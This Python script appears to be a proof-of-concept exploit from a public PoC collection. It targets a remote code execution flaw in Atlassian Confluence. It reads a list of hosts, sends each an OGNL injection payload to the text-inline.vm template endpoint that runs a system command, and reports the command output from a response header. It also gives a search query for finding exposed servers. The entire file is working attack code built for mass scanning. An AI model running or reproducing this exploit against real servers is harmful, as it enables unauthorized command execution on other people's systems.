#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fofa:app="Atlassian-Confluence"
# 

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                        +')
    print(
        '+---------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                      +')
    print(
        '+ EXP: python3 Atlassian_Confluence_text-inline_Rce_Poc.py url.txt                                         +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
urllib3.disable_warnings()
def poc(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Accept-Encoding": "gzip,deflate",
        "Accept":"*/*",
        "Connection":"close",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host":"%s" % host2

    }
    vulurl = url + "/template/aui/text-inline.vm"
    data=r"label=aaa\u0027%2b#request.get(\u0027.KEY_velocity.struts2.context\u0027).internalGet(\u0027ognl\u0027).findValue(#parameters.poc[0],{})%2b\u0027&poc=@org.apache.struts2.ServletActionContext@getResponse().setHeader('Cmd',(new+freemarker.template.utility.Execute()).exec({'id'}))"
    try:
        r = requests.post(vulurl, headers=headers,data=data,verify=False)
        if r.status_code==200 and "Cmd" in str(r.headers) :
            print(url+" id:" + r.headers['Cmd'])
        else:
            return 0
            print (host+":false")
    except:
        return 0

        print (host+":false")

if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])